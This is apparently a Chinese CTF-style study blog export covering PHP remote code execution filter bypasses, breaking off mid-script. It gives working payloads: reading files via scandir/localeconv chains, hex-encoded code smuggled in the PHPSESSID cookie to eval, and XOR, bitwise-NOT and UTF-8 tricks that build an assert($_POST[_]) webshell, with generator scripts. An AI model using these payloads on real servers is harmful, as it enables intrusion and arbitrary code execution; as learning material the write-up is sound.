<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取get的最后一个参数</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取post的最后一个参数</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/QACtqE6daXo4kPY.png" alt="smIJOtgU6pKfZkQ"></p>
<p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
<h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h4><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line">Cookie: PHPSESSID=...</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/vorOeBqGSmPNRTL.png" alt="image.png"></p>
<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p>
<p><img src="https://s2.loli.net/2023/11/18/JruDwYiC5V39HAf.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/11/18/XbGupMPaiDNTne1.png" alt="image.png"></p>
<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p>
<p><img src="https://s2.loli.net/2023/11/18/h8DxXSvGaQzs2gj.png" alt="image.png"></p>
<p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦。</p>
<h4 id="PHP函数绕过"><a href="#PHP函数绕过" class="headerlink" title="PHP函数绕过"></a>PHP函数绕过</h4><h5 id="获取文件名"><a href="#获取文件名" class="headerlink" title="获取文件名"></a>获取文件名</h5><h6 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h6><p>这个函数很好理解，就是列出选中目录中的文件和目录</p>
<p>可以利用<code>getcwd()</code>获取当前目录</p>
<p>故<code>scandir(grtcwd())</code>可以获取到当前目录下的文件名</p>
<p><code>scandir(&#39;.&#39;)</code>也可以获取到当前目录下的文件名（flag.php就在当前目录）。由于是无参数RCE，不能传入参数<code>.</code>，那么如何获取<code>.</code>呢？有以下方法：</p>
<ul>
<li><p><code>chr(46)</code>：<code>chr(46)</code>就是<code>.</code>，那么如何获取46这个数字呢？</p>
<ul>
<li><p><code>chr(rand())</code>：<code>rand()</code>会随时生成一个大数，<code>chr()</code>函数会对参数进行256取余运算，因此<code>chr(rand())</code>有1&#x2F;256的概率是我们希望获取的字符。因此，可以抓包重放，平均256个包成功获取1次<code>chr(46)</code>。</p>
</li>
<li><p><code>chr(time())</code>：<code>time()</code>返回时间戳，一秒一变。因此使用<code>chr(time())</code>，每256秒可以获取到1次<code>chr(46)</code>。</p>
</li>
<li><p><code>chr(current(localtime(time())))</code>：<code>localtime(time())</code>返回一个数组，数组的0号元素表示当前时间的秒（范围是0-59），<code>current</code>是取数组的第一个元素（0号元素）。因此使<code>chr(current(localtime(time())))</code>，每60秒可以获取到1次<code>chr(46)</code>。</p>
</li>
</ul>
</li>
<li><p><code>current(localeconv())</code>：<code>localeconv()</code> 函数返回包含本地数字及货币信息格式的数组，其第一个元素就</p>
<p>是<code>.</code>。因此<code>current(localeconv())</code>或者<code>pos(localeconv())</code>可以确定获取<code>.</code>，推荐使用该方法。</p>
</li>
<li><p><code>phpversion()</code>：利用php版本信息，比如：7.2.1，提取出大版本号（比如7或者5），在经过运算得到46，然后<code>chr(46)</code>得到<code>.</code>，命令为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>())))))))) <span class="comment">#版本为5或者7都可以</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>crypt()</code>：该函数会随机生成一个hash值。命令为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))</span><br><span class="line"><span class="comment"># 大概率得到$ 小概率得到.</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h6 id="查看上级目录"><a href="#查看上级目录" class="headerlink" title="查看上级目录"></a>查看上级目录</h6><p><code>dirname()</code></p>
<p>如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径。就如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;flag_phpbyp4ss&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;html&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<p><code>chdir()</code></p>
<p>改变当前工作目录，就如将当前目录切换为<code>/var/www</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))</span><br></pre></td></tr></table></figure>

<p>就可以读取<code>flag_phpbyp4ss</code>文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/5EUun8xS6sXQ3aA.png" alt="image.png"></p>
<h5 id="从数组中取到目标文件（假设为flag-php）"><a href="#从数组中取到目标文件（假设为flag-php）" class="headerlink" title="从数组中取到目标文件（假设为flag.php）"></a>从数组中取到目标文件（假设为flag.php）</h5><h6 id="end-1"><a href="#end-1" class="headerlink" title="end()"></a><code>end()</code></h6><p>如果flag.php是返回数组的最后一个元素，直接用<code>end()</code>取出即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))</span><br></pre></td></tr></table></figure>

<h6 id="next-array-reverse"><a href="#next-array-reverse" class="headerlink" title="next(array_reverse())"></a><code>next(array_reverse())</code></h6><p>如果flag.php是返回数组的倒数第二个元素，可以通过<code>array_reverse()</code>函数，将数组逆转。这样flag.php就是输出数组的正数第二个元素，可以通过<code>next()</code>操作取到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>

<h6 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a><code>array_rand(array_flip())</code></h6><p><code>array_flip()</code>是将数组的键和值交换，<code>array_rand()</code>是随机取出数组的一个键。<code>array_rand(array_flip())</code>方法就是将数组中的flag.php由值改为键，再用随机的方式取出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>

<p>这种方法的优势是目标字符串在数组的任意位置都可以，缺点是该方法不是100%成功的，需要重放。</p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>无数字字母 RCE 学习记录</title>
    <url>/2024/03/09/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/</url>
    <content><![CDATA[<h1 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h1><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的思路就是利用各种非数字字母的字符，经过各种变换（<strong>异或</strong>、<strong>取反</strong>、<strong>自增</strong>），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p>
<span id="more"></span>

<h2 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h2><h3 id="异或"><a href="#异或" class="headerlink" title="^异或"></a><code>^</code>异或</h3><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong>，<code>ascii码</code>表参考如下：</p>
<p><img src="https://s2.loli.net/2023/11/18/xRKVB7Md5zJTIk4.png" alt="vmfHFZrN9GLSC8j"></p>
<p>那假如说我们想要构造出小写字母<code>a</code>，按照上表，<code>a</code>的二进制为<code>01100001</code>，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，我选择的是<code>@</code>和<code>!</code>这两个，成功异或出了字母<code>a</code>：</p>
<p><img src="https://s2.loli.net/2023/11/18/hNXOnJiDfgxBQlv.png" alt="image.png"></p>
<p>然后我们就可以按照这个方法进行拼接了，我们的目标字符串是<code>assert($_POST[_])</code>，其实很简单，我们需要拼接的字母只有九个而已，拼接结果如下，因为很多都是不可见的字符，所以说我就先url编码了一下（url编码就是它的16进制编码前面加个<code>%</code>哈）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">P:<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; O:<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span> ; S:<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>以上是我自己构造的，经检验没有问题，构造结果可能会有很多种，但方法都是一样的，这样就可以成功进行rce了</p>
<p><img src="https://s2.loli.net/2023/11/18/bIaTjS4VFJ8l69q.png" alt="image.png"></p>
<p>或者直接上脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;_POST&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">Urlencode</span> (<span class="variable">$result1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;^&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">Urlencode</span> (<span class="variable">$result2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;%21%28%28%25%29%28&#x27;</span>^<span class="string">&#x27;%40%5B%5B%40%5B%5C&#x27;</span>; <span class="comment">//构造出assert</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&#x27;%21%2B%2F%28%28&#x27;</span>^<span class="string">&#x27;%7E%7B%60%7B%7C&#x27;</span>; <span class="comment">//构造出_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>; <span class="comment">//$___ = $_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">//assert($_POST[_]);</span></span><br><span class="line"><span class="comment">//放到一排就是</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;%21%28%28%25%29%28&#x27;</span>^<span class="string">&#x27;%40%5B%5B%40%5B%5C&#x27;</span>;<span class="variable">$__</span> = <span class="string">&#x27;%21%2B%2F%28%28&#x27;</span>^<span class="string">&#x27;%7E%7B%60%7B%7C&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<h3 id="取反"><a href="#取反" class="headerlink" title="~取反"></a><code>~</code>取反</h3><h4 id="取反规则"><a href="#取反规则" class="headerlink" title="取反规则"></a>取反规则</h4><h5 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">12</span>;</span><br><span class="line"><span class="variable">$b</span> = ~<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>(-<span class="number">13</span>)</span><br></pre></td></tr></table></figure>

<h5 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h5><p>32位表示二进制的12：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 0000 0000 0000 0000 0000 0000 1100</span><br></pre></td></tr></table></figure>

<p>0与1互换：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>
<p>观察0与1互换后的结果：从左向右看，第一位0正1符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>

<p>负数是用补码表示的，补码是原码取反+1，也就是说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>

<p>是某个数取反+1得到的。也就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0010</span><br></pre></td></tr></table></figure>

<p>计算的-13</p>
<h4 id="如何取反"><a href="#如何取反" class="headerlink" title="如何取反"></a>如何取反</h4><p>取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p>
<h5 id="字母直接取反"><a href="#字母直接取反" class="headerlink" title="字母直接取反"></a>字母直接取反</h5><p>首先，我们想要构造的依然是<code>assert($_POST[_])</code>这条语句，和上面一样，我们先用<code>php</code>的取反符号<code>~</code>将字符串<code>assert</code>和<code>_POST</code>取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可，具体请见下图：</p>
<p><img src="https://s2.loli.net/2023/11/18/smvxWOyJXHwUG2N.png" alt="image.png"></p>
<p>可以看到，<code>assert</code>的取反结果是<code>%9E%8C%8C%9A%8D%8B</code>，<code>_POST</code>的取反结果是<code>%A0%AF%B0%AC%AB</code>，那我们就开始构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);    <span class="comment">//这里利用取反符号把它取回来，$_=assert</span></span><br><span class="line"><span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);      <span class="comment">//$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;                   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);                 <span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);<span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>然后就可以RCE了</p>
<p><img src="https://s2.loli.net/2023/11/18/3JL4aIBtZ2ubSip.png" alt="image.png"></p>
<h5 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h5><p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;卢&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(~(<span class="variable">$_</span>&#123;<span class="number">1</span>&#125;));</span><br><span class="line"><span class="keyword">print</span>(~<span class="string">&quot;\x8d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出rr</span></span><br></pre></td></tr></table></figure>

<p>这里之所以会输出两个相同的<code>r</code>，就是因为里面<code>$_&#123;1&#125;</code>就是<code>\x8d</code>，然后这里对<code>\x86</code>进行取反就能得到<code>r</code></p>
<p>我们需要知道，对于一个汉字进行<code>~($x&#123;0&#125;)</code>或<code>~($x&#123;1&#125;)</code>或<code>~($x&#123;2&#125;)</code>的操作，可以得到某个<code>ascii码</code>的字符值，我们就可以利用这一点构造出<code>webshell</code></p>
<p>用脚本获得中文字（从3000+个汉字中获得通过取反得到assert）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span 